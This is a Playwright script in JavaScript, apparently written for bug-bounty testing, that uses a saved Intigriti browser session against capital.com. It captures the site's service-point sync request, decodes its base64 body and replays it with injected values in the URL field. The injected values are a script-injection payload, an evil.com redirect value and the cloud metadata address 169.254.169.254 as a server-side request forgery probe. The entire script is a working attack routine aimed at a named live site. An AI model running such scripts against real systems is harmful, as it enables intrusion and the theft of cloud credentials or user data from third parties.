const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true });
  const ctx = await browser.newContext({ storageState: 'C:/Users/bryan/.openclaw/workspace/bounty-passive-pipeline/logs/browser-sessions/intigriti-state.json' });
  const page = await ctx.newPage();
  
  // Intercept the actual sync request and replay with modified payload
  let capturedRequest = null;
  ctx.on('request', req => {
    if (req.url().includes('service-point/sync')) {
      capturedRequest = {
        url: req.url(),
        method: req.method(),
        headers: req.headers(),
        postData: req.postData()
      };
    }
  });
  
  await page.goto('https://capital.com', { waitUntil: 'networkidle', timeout: 20000 });
  await page.waitForTimeout(3000);
  
  if (!capturedRequest) {
    console.log('No sync request captured');
    await browser.close();
    return;
  }
  
  console.log('Captured request:');
  console.log('URL: ' + capturedRequest.url);
  console.log('Headers: ' + JSON.stringify(capturedRequest.headers, null, 2));
  console.log('PostData: ' + capturedRequest.postData);
  
  // Now replay with XSS payload in URL
  const originalPayload = JSON.parse(Buffer.from(capturedRequest.postData, 'base64').toString('utf8'));
  console.log('\nOriginal payload decoded:');
  console.log(JSON.stringify(originalPayload, null, 2));
  
  // Modify URL to include XSS
  const xssPayloads = [
    { url: 'https://capital.com/en-gb?q=<img src=x onerror=alert(1)>' },
    { url: 'https://capital.com/en-gb?q=https://evil.com' },
    { url: 'https://capital.com/en-gb?q=http://169.254.169.254/latest/meta-data/' },
  ];
  
  console.log('\n=== Replaying with XSS payloads ===');
  for (const xss of xssPayloads) {
    const modPayload = originalPayload.map(e => ({ ...e, url: xss.url }));
    const encoded = Buffer.from(JSON.stringify(modPayload)).toString('base64');
    
    try {
      const r = await page.request.post(capturedRequest.url, {
        data: encoded,
        headers: capturedRequest.headers,
        timeout: 5000
      });
      const t = await r.text();
      console.log(r.status() + ' | ' + xss.url.slice(0, 60) + ' | ' + t.slice(0, 80));
    } catch (e) {
      console.log('ERR | ' + xss.url.slice(0, 60));
    }
  }
  
  await browser.close();
})().catch(e => { console.error(e.message); process.exit(1); });
